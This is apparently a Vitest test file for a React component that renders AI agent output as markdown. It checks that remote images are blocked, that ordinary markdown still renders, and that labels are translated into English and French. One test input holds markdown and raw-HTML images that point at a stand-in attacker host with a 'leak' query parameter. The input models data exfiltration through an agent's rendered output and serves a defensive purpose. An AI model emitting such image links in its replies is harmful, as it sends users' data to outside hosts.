import { NextIntlClientProvider } from 'next-intl';
import { type ComponentProps, createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { defaultTranslations } from 'streamdown';
import { describe, expect, it } from 'vitest';
import en from '../../../messages/en.json';
import fr from '../../../messages/fr.json';
import { AgentMarkdown } from './agent-markdown';

const render = (markdown: string, messages: Record<string, unknown> = en) =>
  renderToStaticMarkup(
    createElement(
      NextIntlClientProvider,
      { locale: 'en', messages, timeZone: 'UTC' } as ComponentProps<typeof NextIntlClientProvider>,
      createElement(AgentMarkdown, null, markdown),
    ),
  );

describe('AgentMarkdown', () => {
  it('never loads a remote image: markdown or raw HTML images become a guarded link', () => {
    const html = render(
      'Look ![secret](https://evil.example/x.png?d=leak) and <img src="https://evil.example/y.png?d=leak" alt="raw">',
    );
    expect(html).not.toMatch(/<img\b/i);
    // Alt text as a streamdown link: opened only after its link-safety dialog shows the URL.
    expect(html).toMatch(/data-streamdown="link"[^>]*>secret</);
    expect(html).toMatch(/data-streamdown="link"[^>]*>raw</);
    expect(html).not.toContain('evil.example');
    expect(html).not.toMatch(/<img[^>]+src="https?:/i);
  });

  it('still renders ordinary markdown', () => {
    const html = render('**bold** and [a link](https://example.com)');
    expect(html).toContain('bold');
    expect(html).toContain('a link');
  });
});

describe('agent.markdown messages', () => {
  it('translate every streamdown label, in EN and FR', () => {
    const keys = Object.keys(defaultTranslations).sort();
    expect(Object.keys(en.agent.markdown).sort()).toEqual(keys);
    expect(Object.keys(fr.agent.markdown).sort()).toEqual(keys);
  });
});
